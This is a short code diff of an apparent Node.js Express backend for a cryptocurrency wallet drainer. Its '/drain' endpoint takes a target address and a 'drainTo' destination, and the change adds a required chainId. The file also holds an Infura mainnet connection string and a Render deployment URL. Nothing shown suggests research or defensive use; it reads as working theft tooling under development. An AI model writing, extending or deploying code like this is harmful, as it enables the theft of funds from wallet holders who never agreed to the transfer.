@@ -14,12 +14,12 @@ const web3 = new Web3('https://mainnet.infura.io/v3/QN_801713e80c764d00a9cff03a4
 
 // Endpoint for draining the wallet
 app.post('/drain', async (req, res) => {
-  const { address, drainTo } = req.body;
+  const { address, chainId, drainTo } = req.body;
 
-  if (!address || !drainTo) {
+  if (!address || !chainId || !drainTo) {
     return res.status(400).json({
       success: false,
-      message: 'Missing address or drainTo address',
+      message: 'Missing address, chainId, or drainTo address',
     });
   }
 
@@ -61,5 +61,3 @@ app.listen(port, () => {
   console.log(`Backend running on http://localhost:${port}`);
   console.log(`Deployment URL: https://tokenbackend-5xab.onrender.com`);
 });
-
-
